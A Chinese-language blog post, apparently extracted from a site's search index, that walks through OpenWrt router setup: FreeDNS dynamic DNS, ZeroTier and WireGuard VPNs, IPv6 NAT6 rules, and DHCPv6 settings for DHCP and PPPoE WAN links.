<p>openwrt\u63d2\u4ef6\u4e0b\u8f7d\uff1aluci-ddns-app</p> <p></p> </li> <li> <p>DDNS Service provider\u9009\u62e9afraid.org-keyauth\uff08\u4e5f\u53ef\u4f7f\u7528afraid.orgv2-token\uff0c\u4f46\u662f\u4e0b\u4e00\u6b65\u4f7f\u7528\u7684\u7f16\u7801\u5219\u4f7f\u7528\u4e0a\u4e00\u79cd\u65b9\u5f0f\u4e2d\u5f00\u542fRandomized Update Token\u5904\u7684token\uff09</p> </li> <li> <p>password\u5904\u586b\u5199\u6bcf\u4e2a\u5b50\u57df\u540d\u5bf9\u5e94\u66f4\u65b0\u94fe\u63a5\u4e2d\u7684\u7f16\u7801\uff08\u5728FreeDNS\u6bcf\u4e2a\u5b50\u57df\u540d\u7684Direct URL\u4e2d\u53ef\u89c1\uff09</p> <p>\u7c7b\u4f3c\u5982\u4e0b\u683c\u5f0f</p> <pre><code>https://freedns.afraid.org/dynamic/update.php?Zk9FOG55RxxxxxxxIwMTY3ODY0\n</code></pre> </li> <li> <p>\u5176\u4f59domain\uff0cusername\u90fd\u53ef\u4ee5\u968f\u4fbf\u586b</p> </li> </ul> <p></p> <ul> <li> <p>\u5728Advanced Setting\u4e2d\u9009\u62e9netwrok</p> <p></p> </li> <li> <p>\u4fdd\u5b58\u5e94\u7528\u540e\uff0c\u70b9\u51fbreload\uff0c\u53ef\u4ee5\u5728Log File Viewer\u4e2d\u67e5\u770b\u662f\u5426\u6210\u529f\u8fd0\u884c\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\u7b2c\u4e00\u6b21\u5b8c\u6210\u66f4\u65b0\uff0c\u7b2c\u4e8c\u6b21\u4e0d\u66f4\u65b0</p> <pre><code>212943       : Detect registered/public IP\n   212943       : #&gt; /usr/bin/nslookup rm.ipv6.my.to  &gt;/var/run/ddns/FreeDNS_ipv6.dat 2&gt;/var/run/ddns/FreeDNS_ipv6.err\n   212943       : Registered IP '2409:8a38:1600:7e42:9e9d:7e1f:cfc6:de30' detected\n   212943  info : Starting main loop at 2022-01-25 21:29\n   212943       : Detect local IP on 'network'\n   212943       : Local IP '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' detected on network 'wan_6'\n   212943       : Update needed - L: '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' &lt;&gt; R: '2409:8a38:1600:7e42:9e9d:7e1f:cfc6:de30'\n   212943       : Force communication via device 'pppoe-wan'\n   212943       : #&gt; /usr/bin/curl -RsS -o /var/run/ddns/FreeDNS_ipv6.dat --stderr /var/run/ddns/FreeDNS_ipv6.err --interface pppoe-wan --noproxy '*' 'https://freedns.afraid.org/dynamic/update.php?***PW***&amp;address=2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30'\n   212945       : DDNS Provider answered:\n  Updated 1 host(s) rm.ipv6.my.to to 2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30 in 0.335 seconds\n   212945  info : Update successful - IP '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' send\n   212945  info : Forced update successful - IP: '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' send\n   212945       : Waiting 600 seconds (Check Interval)\n\n\n   213945       : Detect registered/public IP\n   213945       : #&gt; /usr/bin/nslookup rm.ipv6.my.to  &gt;/var/run/ddns/FreeDNS_ipv6.dat 2&gt;/var/run/ddns/FreeDNS_ipv6.err\n   213947       : Registered IP '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' detected\n   213947  info : Rerun IP check at 2022-01-25 21:39\n   213947       : Detect local IP on 'network'\n   213947       : Local IP '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' detected on network 'wan_6'\n   213947       : Waiting 600 seconds (Check Interval)\n</code></pre> </li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#zerotier","title":"ZeroTier","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u4f5c\u7528","title":"\u4f5c\u7528","text":"<ol> <li>\u5c06\u82e5\u5e72\u4e2a\u5b89\u88c5\u4e86Zerotier\u7684\u8bbe\u5907\u6dfb\u52a0\u5230\u4e00\u4e2a\u865a\u62df\u7684\u5927\u5c40\u57df\u7f51\u4e2d\u4e92\u76f8\u8bbf\u95ee</li> <li>\u53ef\u4ee5\u5728Zerotier\u4e2d\u8bbe\u7f6eRoute\uff0c\u4ece\u800c\u5b9e\u73b0\u8bbf\u95ee\u67d0\u4e2azerotier\u8bbe\u5907\u6240\u5904\u5c40\u57df\u7f51\u4e2d\u7684\u5176\u5b83\u8bbe\u5907</li> </ol>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5177\u4f53\u8fc7\u7a0b","title":"\u5177\u4f53\u8fc7\u7a0b","text":"<ol> <li> <p>\u53bbZeroTier\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\uff0c\u5e76\u4e86\u89e3ZeroTier\u7684\u4f7f\u7528</p> </li> <li> <p>\u5b89\u88c5zerotier</p> </li> </ol> <pre><code>opkg update\nopkg install zerotier\n</code></pre> <p>\u8fd9\u91cc\u4f1a\u4f9d\u8d56kmod-tun\u7b49\u5185\u6838\u6a21\u5757\uff0c\u8fd9\u8981\u6c42\u5185\u6838\u7248\u672c\u5b8c\u5168\u4e00\u81f4\u624d\u80fd\u5b89\u88c5\u6210\u529f\u3002</p> <ul> <li>\u5982\u679c\u4f7f\u7528\u7684\u662fopenwrt\u5f00\u53d1\u7248\u672c(snapshot)\uff1a\u7531\u4e8esnapshot\u6bcf\u5929\u3001\u751a\u81f3\u51e0\u4e2a\u5c0f\u65f6\u5c31\u4f1a\u66f4\u65b0\uff0c\u56e0\u6b64\u5f88\u6709\u53ef\u80fd\u56e0\u4e3a\u6709\u4e86\u65b0\u7684\u66f4\u65b0\uff0c\u5bfc\u81f4opkg\u4e0b\u8f7d\u7684kmod-tun\u5185\u6838\u7248\u672c\u4e0d\u4e00\u81f4\u5bfc\u81f4\u62a5\u9519\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a\u66f4\u65b0\u4e3a\u65b0\u7248\u7684\u5f00\u53d1\u7248\uff0c\u5e76\u5c3d\u5feb\u4e0b\u8f7d\u5b89\u88c5\u3002\u6216\u8005\u81ea\u5df1\u7f16\u8bd1openwrt\u3002</li> <li> <p>\u5bf9\u4e8estable\u7248\u672c\uff0c\u5b98\u65b9\u6e90\u4fdd\u8bc1\u4e86\u4e00\u81f4\u6027\uff0c\u56e0\u6b64\u8fd9\u91cc\u4e0d\u4f1a\u51fa\u73b0\u95ee\u9898\u3002</p> </li> <li> <p>\u914d\u7f6eZeroTier</p> </li> <li> <p>\u521b\u5efa\u76ee\u5f55\uff1a   mkdir -p /etc/zerotier</p> </li> <li> <p>\u4fee\u6539/etc/config/zerotier\u5185\u5bb9\uff08\u5b58\u5728\u6837\u672c\u914d\u7f6e\uff09\uff0c\u4e0b\u9762\u4ee3\u7801\u4e3a\u4f7f\u7528\u547d\u4ee4\u884c\u914d\u7f6e\u65b9\u6cd5    <pre><code>uci set zerotier.openwrt_network=zerotier\nuci add_list zerotier.openwrt_network.join='\u4f60\u7684\u7f51\u7edcID'\nuci set zerotier.openwrt_network.enabled='1'\nuci set zerotier.openwrt_network.config_path='/etc/zerotier'\nuci commit zerotier\n</code></pre></p> </li> <li> <p>\u542f\u52a8zerotier\uff08\u8fd9\u6b65\u4e4b\u540e\u5df2\u7ecf\u53ef\u4ee5\u4eceZeroTier Central\u4e2d\u770b\u5230\u8def\u7531\u5668\u8fde\u4e0a\u4e86\uff09</p> </li> </ul> <pre><code>/etc/init.d/zerotier enable\n/etc/init.d/zerotier start\n</code></pre> <ol> <li> <p>\u521b\u5efa\u63a5\u53e3\uff08\u8fd9\u6b65\u4e4b\u540e\u5df2\u7ecf\u53ef\u4ee5ping\u901a\uff09</p> </li> <li> <p>web\u754c\u9762\uff0c\u7f51\u7edc -&gt; \u63a5\u53e3\uff0c\u6dfb\u52a0\u65b0\u63a5\u53e3</p> </li> <li>\u540d\u79f0 ZeroTier</li> <li>\u534f\u8bae\u9009\u9759\u6001\u534f\u8bae\uff0cip\u8bbe\u7f6e\u4e3aZeroTier Central\u4e2d\u7684ip</li> <li>\u63a5\u53e3\u9009z\u5f00\u5934\u7684\u9002\u914d\u5668</li> <li>\u521b\u5efa/\u5206\u914d\u9632\u706b\u5899\u533a\u57df\u9009\u62e9lan\uff08\u5176\u5b9elan/wan\u90fd\u53ef\u4ee5\uff09</li> <li>\u4fdd\u5b58&amp;\u5e94\u7528</li> </ol> <pre><code>uci set network.Zerotier=interface\nuci set network.Zerotier.proto='static'\nuci set network.Zerotier.device='ztyou4dlov'\nuci set network.Zerotier.netmask=$ZEROTIER_MASK\nuci set network.Zerotier.ipaddr=$ZEROTIER_IP\necho \"[INFO] add zerotier to lan zone\"\nuci add_list firewall.@zone[0].network='Zerotier' \u00a0 # add Zerotier to lan\n</code></pre> <ol> <li>\u9632\u706b\u5899</li> </ol> <p>\u5168\u90e8\u8bbe\u7f6e\u6210allow</p> <p></p> <ol> <li>ZeroTier Central\u914d\u7f6e\u8def\u7531\u8f6c\u53d1</li> </ol> <p>\u914d\u7f6e\u8fd9\u4e2a\u540e\uff0c\u5728\u5916\u7f51\u53ef\u4ee5\u901a\u8fc7\u5c40\u57df\u7f51ip\u76f4\u63a5\u8bbf\u95ee\u4e0d\u5728ZeroTier Central\u4e2d\u7684\u5176\u5b83\u5c40\u57df\u7f51\u8bbe\u5907\u3002\uff08\u8fc7\u7a0b\u5927\u81f4\u662f\uff1a\u5916\u7f51 -&gt; zerotier -&gt; \u5c40\u57df\u7f51\u4e00\u53f0\u8bbe\u5907(\u4f4d\u4e8eZeroTier\u4e2d) -&gt; \u5c40\u57df\u7f51\u5176\u5b83\u8bbe\u5907\uff09</p> <p>\u914d\u7f6e\u56fe\uff1a\u8bbf\u95ee192.168.31.*\u4e2d\u7684\u8bbe\u5907\u65f6\uff0c\u4f1a\u901a\u8fc7192.168.192.168(\u5b9e\u9645\u5c40\u57df\u7f51ip\u4e3a\u8def\u7531\u5668)\u8bbf\u95ee</p> <p></p> <p>\u6ce8\u610f\uff1a\u522b\u5c06\u7b2c\u4e00\u884c\u7684\u5220\u4e86\uff0c\u5426\u5219\u5168\u90e8\u65e0\u6cd5\u8bbf\u95ee</p> <p>\u7f3a\u70b9\uff1a\u76ee\u524d\u53d1\u73b0\uff0c\u5f53\u4e24\u53f0\u7535\u8111\u4f4d\u4e8e\u540c\u4e00\u4e2a\u5c40\u57df\u7f51\uff0c\u60f3\u8981\u76f4\u63a5\u901a\u8fc7\u5c40\u57df\u7f51ip\u8bbf\u95ee\u65f6\uff0c\u5373\u4f7f\u6ca1\u6709\u5f00\u542fzerotier\u8f6f\u4ef6\uff0c\u4e24\u53f0\u7535\u8111\u7684\u76f8\u4e92\u8bbf\u95ee\u901f\u5ea6\u4e5f\u4f1a\u4e25\u91cd\u53d7\u9650\uff08\u539f\u672c\u53ef\u4ee5\u8dd1\u5230500M\uff0c\u76f4\u63a5\u964d\u4e3a10M\uff09</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#wireguard","title":"Wireguard","text":"<ul> <li>\u5b98\u65b9\u6559\u7a0b\uff1a[OpenWrt Wiki] WireGuard server</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<ul> <li>\u5b89\u88c5wireguard   wiregurad\u662f\u5185\u6838\u6a21\u5757\uff0c\u5982\u679c\u662f\u81ea\u5df1\u7f16\u8bd1\u7684openwrt\u5219\u65e0\u6cd5\u901a\u8fc7opkg\u5b89\u88c5(linux kernel hash\u6821\u9a8c\u5931\u8d25\u5bfc\u81f4\u4f9d\u8d56\u4e0d\u6ee1\u8db3\uff09\uff0c\u9700\u8981\u5728\u7f16\u8bd1\u65f6\u96c6\u6210\u5230openwrt\u4e2d\u3002\u6216\u8005\u624b\u52a8\u5b89\u88c5</li> </ul> <pre><code>opkg update\nopkg install luci-app-wireguard\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u914d\u7f6e_1","title":"\u914d\u7f6e","text":"<p>\u65b0\u624b\u4f7f\u7528luci\u914d\u7f6e\uff0c\u4e4b\u540e\u76f4\u63a5\u590d\u5236\u5230/etc/config/network\u4e2d\u5373\u53ef - \u521b\u5efa\u63a5\u53e3   - web\u754c\u9762\uff0c\u7f51\u7edc -&gt; \u63a5\u53e3\uff0c\u6dfb\u52a0\u65b0\u63a5\u53e3   - \u540d\u79f0wireguard   - \u534f\u8bae\u9009wiregurad VPN   - \u751f\u6210\u79c1\u94a5   - \u8bbe\u7f6eip\u5730\u5740\u4e3a\u865a\u62df\u5c40\u57df\u7f51\u5730\u5740\uff0c\u598210.0.31.10/24   - \u4fdd\u5b58&amp;\u5e94\u7528</p> <ul> <li>\u6dfb\u52a0peer</li> <li>\u5728Luci\u4e2d\u624b\u52a8\u6dfb\u52a0</li> <li> <p>\u6216\u8005\u7f16\u8f91<code>/etc/config/network</code>\uff0c\u6dfb\u52a0\u5df2\u6709\u7684\u8bbe\u5907\uff0c\u5982     <pre><code>config wireguard_wireguard\n    option public_key 'anjf3DtB6EkSo88uBXk8zFMLAZ3W2gD7AmXjqRl2mgM='\n    list allowed_ips '10.0.31.2/32'\n    option route_allowed_ips '1'\n    option description 'ryzen5800X'\n</code></pre></p> </li> <li> <p>\u4f7f\u5176\u751f\u6548\u65b9\u5f0f\uff1a</p> </li> <li>\u91cd\u542f\u8def\u7531\u5668</li> <li>\u91cd\u542f\u7f51\u7edc\u63a5\u53e3</li> <li>\u547d\u4ee4\u884c\u91cd\u542f\u7f51\u7edc\u63a5\u53e3   <pre><code>ifconfig wg_s2s down &amp;&amp; ifup wg_s2s\n</code></pre></li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ipv6","title":"ipv6","text":"<p>op\u6709ipv6\u7f51\u7edc\u73af\u5883\uff0c\u5982\u4f55\u8ba9wg\u63a5\u5165\u7684\u8bbe\u5907\u4e5f\u80fd\u62e5\u6709ipv6\u73af\u5883\uff1f</p> <p>\u53ef\u4ee5\u7ed9op\u548cpeer\u8bbe\u7f6eULA\u7684ipv6\u5730\u5740\uff0cpeer\u7684ipv6\u5305\u5230\u8fbeop\u540e\uff0c\u9700\u8981\u4eceop\u7684\u7f51\u7edc\u63a5\u53e3\u51fa\u53bb\uff08\u6bd4\u5982wan\uff09\u3002\u4f46\u662fwan\u7684masq\u9ed8\u8ba4\u662f\u4e0d\u5bf9ipv6\u6d41\u91cf\u8fdb\u884csrc nat\u7684\u3002\u8fd9\u91cc\u6211\u4eec\u60f3\u8981\u505a\u5230\uff1a - \u4ecewg\u63a5\u53e3\u8fdb\u5165op\u7684\u6d41\u91cf\uff0c\u4ecewan\u51fa\u53bb\u65f6\uff0c\u5bf9ipv6\u7684\u6e90\u5730\u5740\uff08ULA\u5730\u5740\uff09\u8fdb\u884cnat - \u5176\u5b83ipv6\u6d41\u91cf\uff08\u6e90\u5730\u5740\u4e3a\u5206\u914d\u7684\u516c\u7f51ipv6\u5730\u5740\uff09\u4ecewan\u51fa\u53bb\u65f6\uff0c\u4e0d\u8fdb\u884cnat</p> <ol> <li>\u4f9d\u8d56\uff0c\u5bf9\u4e8e22.03\u4ee5\u540e\u7684\u7248\u672c\uff0c\u5b9e\u6d4b\u4e0d\u9700\u8981\u5b89\u88c5\u5176\u5b83\u5185\u6838\u6a21\u5757\u3002\u5b98\u65b9\u6587\u6863\u5199\u5bf9\u4e8eopenwrt21.02 \uff0c\u9700\u8981\u5b89\u88c5nat\u6a21\u5757 <pre><code>opkg install kmod-ipt-nat6\n</code></pre></li> <li> <p>wg\u63a5\u53e3\u8bbe\u7f6eipv6\u5730\u5740\u3002\u4eceULA\u5730\u5740\u6bb5\u9009\u53d6\u4e00\u4e2a\uff1aUnique local address - Wikipedia\uff0c\u5982\u56fe\u6240\u793a\u3002  \u6211\u9009\u62e9\u4e86\u4e00\u4e2a48\u7684\u7f51\u6bb5 <pre><code>fdab:2333:2333::2/48\n</code></pre></p> </li> <li> <p>\u8bbe\u7f6enft\u89c4\u5219\uff0c\u4ecewg\u63a5\u53e3\u8fdb\u5165\u7684\u6d41\u91cf\u51fa\u53bb\u65f6\u9700\u8981\u8fdb\u884csrc nat\u3002 <pre><code>vim /etc/nftables.d/11-nat6-wg.nft\n\nchain srcnat_ula6_wg0 {\n        type nat hook postrouting priority srcnat; policy accept;\n        oifname \"eth0\" ip6 saddr fdab:2333:2333::/48 counter masquerade comment \"!fw4: ULA masquerade6\"\n}\nchain srcnat_ula6_wg1 {\n        type nat hook postrouting priority srcnat; policy accept;\n        oifname \"eth0\" ip6 saddr fdab:2333:2334::/48 counter masquerade comment \"!fw4: ULA masquerade6\"\n}\n\nservice firewall restart\n</code></pre></p> </li> <li> <p>\u5141\u8bb8ULA\u5730\u5740\u8def\u7531\u3002\u867d\u7136\u6211\u4eec\u4e0a\u9762\u5f00\u542f\u4e86SNAT\u662f\u4e0d\u4f1a\u628a\u79c1\u6709\u5730\u5740\u53d1\u9001\u5230\u516c\u7f51\u7684\uff0c\u4f46\u662f\u8def\u7531\u5668\u5bf9\u4e8eULA\u5730\u5740\u4ecd\u7136\u9ed8\u8ba4\u662f\u4e0d\u4f1a\u8fdb\u884c\u8def\u7531\u8f6c\u53d1\u7684\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\u3002\uff08\u8fd9\u91cc\u8981\u6ce8\u610f\u7684\u662f\u9632\u706b\u5899postrouting\u89c4\u5219\u662f\u5728\u8fdb\u884c\u8def\u7531\u9009\u62e9\u4e4b\u540e\u751f\u6548\u7684\uff0c\u53c2\u8003netfilter-packet-flow\uff09</p> </li> <li>\u5bf9\u4e8ewan6\u53e3\u901a\u8fc7dhcpv6\u4e0a\u7f51\uff0c\u53ea\u9700\u8981\u8bbe\u7f6esourcefilter=0\u3002</li> <li>\u5bf9\u4e8epppoe\u4e0a\u7f51\uff0c\u6ca1\u6709wan6\u63a5\u53e3\uff0c\u6682\u65f6\u8fd8\u4e0d\u77e5\u9053\u600e\u4e48\u914d\u7f6e\u3002 <pre><code>uci set network.wan6.sourcefilter=\"0\"\nuci commit\nifup wan6\n</code></pre></li> </ol> <p>\u53c2\u8003 - WireGuard VPN with ULA and NAT6? - Installing and Using OpenWrt / Network and Wireless Configuration - OpenWrt Forum - [OpenWrt Wiki] WireGuard Road-Warrior Configuration   - NAT6 through your upstream\u00a0IPv6\u00a0interface when routing\u00a0IPv6\u00a0peer traffic from a ULA (configuration B, or configuration A if the peer only uses a ULA)</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7f51\u7edc","title":"\u7f51\u7edc","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ipv6_1","title":"IPv6","text":"<p>\u5b89\u88c5\u597dopenwrt(21.02)\u540e\uff0c\u4f1a\u9ed8\u8ba4\u5f00\u542f\u5e76\u914d\u7f6eipv6\uff0c\u7535\u8111\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95eeipv6\u3002\u4f46\u662f\u8be5\u65b9\u5f0f\u53ea\u6709\u8def\u7531\u5668\u80fd\u5f97\u5230\u4e00\u4e2a\u516c\u7f51ipv6\u5730\u5740\uff0c\u8def\u7531\u5668\u5c40\u57df\u7f51\u5185\u8bbe\u5907\u53ea\u6709\u672c\u5730ipv6\u5730\u5740\u3002\u7c7b\u4f3c\u4e8eOpenwrt\u5f00\u542f\u4e86\u4e00\u5c42ipv6\u7684NAT\u3002\u800c\u4e3a\u4e86\u8ba9\u8fde\u4e0a\u8def\u7531\u5668\u7684\u6240\u6709\u8bbe\u5907\u83b7\u5f97\u516c\u7f51ipv6\u5730\u5740\uff0c\u9700\u8981\u8fdb\u884c\u4ee5\u4e0b\u8bbe\u7f6e</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7406\u8bba","title":"\u7406\u8bba","text":"<ul> <li> <p>ICMPv6\u6709\u591a\u79cd\u62a5\u6587\u683c\u5f0f\uff0c\u5927\u4f53\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\uff0c\u5dee\u9519\u62a5\u6587\u548c\u6570\u636e\u62a5\u6587\u3002ipv6\u4f7f\u7528ICMPv6\u4e2d\u7684\u4e00\u7cfb\u5217\u62a5\u6587RS, RA, NS, NA\uff08R--&gt; router, N--&gt;neighbor, S--&gt;solicitation, A--&gt;advertisement\uff09\u6765\u5b8c\u6210\u5730\u5740\u89e3\u6790(\u901a\u8fc7ip\u83b7\u5f97MAC)\u3001\u90bb\u5c45\u4e0d\u53ef\u8fbe\u68c0\u6d4b\u3001\u5730\u5740\u51b2\u7a81\u68c0\u6d4b\u3001\u5730\u5740\u5206\u914d(SLAAC)\u7b49\u4efb\u52a1\u3002</p> </li> <li> <p>SLAAC(Stateless Address Autoconfiguration)\uff1a\u65e0\u72b6\u6001\u7684\u5730\u5740\u81ea\u52a8\u914d\u7f6e\u534f\u8bae\u3002\u4f7f\u7528RA\u8fdb\u884c\u5730\u5740\u914d\u7f6e\uff0c\u7279\u70b9\u662f\u65e0\u72b6\u6001\u7684\u3002DHCPv6\u5219\u662f\u6709\u72b6\u6001\u7684\u3002\u76ee\u524d\u4f1a\u6df7\u5408\u4f7f\u7528\u8fd9\u4e24\u4e2a\u534f\u8bae\u6765\u914d\u7f6eipv6\u3002</p> </li> </ul> <p>\u8be6\u7ec6\uff1a\u4e00\u4e2a\u63a5\u53e3up\u65f6\uff0c\u4f1a\u53d1\u9001\u4e00\u4e2aRS\u62a5\u6587\u8bf7\u6c42\u7f51\u7edc\u524d\u7f00\u3002\u5176\u5b83\u8bbe\u5907\u8fd4\u56de\u4e00\u4e2aRA\u62a5\u6587\u3002\u8bbe\u5907\u901a\u8fc7\u524d\u7f00+EUI64\u81ea\u52a8\u751f\u6210ipv6\u5730\u5740\u3002\u8bbe\u5907\u7684\u9ed8\u8ba4\u7f51\u5173\uff08\u8def\u7531\u8868\u4e2d::\u9879\uff09\u4e5f\u88ab\u8bbe\u7f6e\u4e3a\u54cd\u5e94\u8005\uff0c\u540c\u65f6\u8bbe\u7f6e\u4e00\u4e2a\u7f51\u5173\u7684\u6709\u6548\u65f6\u95f4\u3002\u5176\u5b83\u8bbe\u5907\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53d1\u9001\u4e00\u4e2aRA\u62a5\u6587\u3002200-600s</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#wan\u53e3\u4e3adhcp","title":"WAN\u53e3\u4e3adhcp","text":"<p>\u8fd9\u79cd\u60c5\u51b5\uff0c\u8def\u7531\u5668\u4e3a\u4e00\u4e2a\u4e8c\u7ea7\u7684\u8def\u7531\u5668\uff0c\u76f4\u63a5\u8f6c\u53d1WAN\u4f20\u6765\u7684RA\u62a5\u6587\u5373\u53ef\u3002</p> <p>\u4fee\u6539<code>/etc/config/dhcp</code></p> <ul> <li>lan\u548cwan6 \u6dfb\u52a03\u4e2arelay\uff08\u5176\u4e2dwan6\u90e8\u5206\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u6dfb\u52a0\uff09</li> <li>\u8bbe\u7f6e\u4e00\u4e2amaster</li> </ul> <pre><code>config dhcp 'lan'\n        option interface 'lan'\n        option start '100'\n        option limit '150'\n        option leasetime '12h'\n        option dhcpv4 'server'\n        option ra 'relay'\n        option dhcpv6 'relay'\n        option ndp 'relay'\n        list ra_flags 'none'\n\nconfig dhcp 'wan'\n        option interface 'wan'\n        option ignore '1'\n\nconfig dhcp 'wan6'\n        option interface 'wan'\n        option ra 'relay'\n        option dhcpv6 'relay'\n        option ndp 'relay'\n        option master '1'\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9759\u6001ipv6","title":"\u9759\u6001ipv6","text":"<p>\u7406\u8bba\u4e0a\u83b7\u5f97\u4e86\u4e00\u4e2aipv6\u524d\u7f00\u540e\uff0c\u53ef\u4ee5\u81ea\u5df1\u8bbe\u7f6e\u9759\u6001\u7684ipv6\u5730\u5740\uff0c\u57fa\u672c\u4e0d\u4f1a\u548c\u522b\u4eba\u53d1\u751f\u51b2\u7a81\u3002</p> <p>\u53ef\u4ee5\u5728WAN6 interface\u4e2d\u8bbe\u7f6e\u4e3astatic\uff08\u52a8\u6001\u4e3aDHCPv6 client)\uff0c\u5e76\u8bbe\u7f6e\u4e00\u4e2aipv6\u5730\u5740\u3002</p> <p>\u4ee5\u4e0b\u4e3a\u4fee\u6539\u540e\u7684<code>/etc/config/network</code>\u5185\u5bb9</p> <pre><code>config interface 'wan'\n    option device 'wan'\n    option proto 'dhcp'\n\nconfig interface 'wan6'\n    option device 'wan'\n    option proto 'static'\n    list ip6addr '2001:da8:d800:611::123d/64'\n    option ip6gw '2001:da8:d800:611::1'\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#wan\u53e3\u4e3apppoe","title":"WAN\u53e3\u4e3apppoe","text":"<p>\u8fd9\u79cd\u60c5\u51b5\uff0c\u4e0d\u80fd\u4f7f\u7528\u4e0a\u9762\u7684\u5168\u90e8\u914d\u7f6e\u4e3arelay\u7684\u65b9\u5f0f\u3002\u521a\u5f00\u59cb\u5168\u90e8\u914d\u7f6e\u4e3arelay\u540e\uff0c\u53d1\u73b0\u8bbe\u5907\u9700\u8981\u5148ping\u4e00\u4e0b\u8def\u7531\u5668\u7684WAN\u53e3ipv6\u5730\u5740\u4e4b\u540e\uff0c\u624d\u80fd\u6b63\u5e38ipv6\u4e0a\u7f51\u3002</p> <p>\u6211\u8fd8\u6ca1\u6709\u641e\u61c2\u662f\u4e3a\u4ec0\u4e48\uff0c\u7ecf\u8fc7\u4e0d\u65ad\u5404\u79cd\u5c1d\u8bd5\u540e\uff0c\u53d1\u73b0\u4ee5\u4e0b\u914d\u7f6e\u6210\u529f\u3002</p> <ul> <li>\u9996\u5148wan\u53e3\u8bbe\u7f6e\u4e3apppoe\u540e\uff0c\u62e8\u53f7\u6210\u529f\u540e\u4f1a\u751f\u6210\u4e00\u4e2aWAN_6\u865a\u62df\u63a5\u53e3\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06WAN6\u63a5\u53e3\u5220\u6389</li> </ul> <p>\uff08\u4ee5\u4e0b\u4e3a\u6700\u7ec8\u6210\u529f\u7684\u622a\u56fe\uff09</p> <p></p> <ul> <li>\u7136\u540e\u9700\u8981\u5c06WAN\u4e2d\u7684DHCP Server\u8bbe\u7f6e\u4e3a\u5ffd\u7565\uff0c\u4e4b\u540e\u9700\u8981\u914d\u7f6eLAN</li> </ul> <p></p> <ul> <li>LAN\u4e2dRA\u548cDHCPv6\u90fd\u9700\u8981\u8bbe\u7f6e\u4e3aserver</li> </ul> <p></p> <p>\u200b \u7136\u540eAdvanced\u4e2d\u9700\u8981\u5f00\u542fDelegate IPv6 prefixes\uff0c\u6700\u7ec8\u6548\u679c\u5c31\u662fLAN\u63a5\u53e3\u4e2d\u4e5f\u51fa\u73b0\u4e86ipv6\u5730\u5740</p> <p></p> <p>\u8bb0\u5f55\u4e0b\u6700\u540e\u7684\u914d\u7f6e\u6587\u4ef6</p> <p><code>/etc/config/dhcp</code></p> <pre><code>config dhcp 'lan'\n        option interface 'lan'\n        option start '100'\n        option limit '150'\n        option leasetime '12h'\n        option dhcpv4 'server'\n        option dhcpv6 'server'\n        option ra 'server'\n        list ra_flags 'managed-config'\n        list ra_flags 'other-config'\n\nconfig dhcp 'wan'\n        option interface 'wan'\n        option ignore '1'\n</code></pre> <p><code>/etc/config/network</code></p> <pre><code>config interface 'lan'\n        option device 'br-lan'\n        option proto 'static'\n        option netmask '255.255.255.0'\n        option ipaddr '192.168.33.1'\n        option ip6assign '60'\n        list ip6class 'wan_6'\n\nconfig interface 'wan'\n        option device 'wan'\n        option proto 'pppoe'\n        option username 'xxx'\n        option password 'xxx'\n        option ipv6 'auto'\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dnsdnsmasq","title":"DNS/dnsmasq","text":"<p>dnsmasq\u4e3b\u8981\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e<code>/etc/config/dhcp</code> \u914d\u7f6e\u6587\u4ef6\u6587\u6863\uff1a[OpenWrt Wiki] DNS and DHCP configuration /etc/config/dhcp</p> <ul> <li>\u5141\u8bb8\u9664\u5c40\u57df\u7f51\u5185\u8bbe\u5907\u8bbf\u95ee</li> 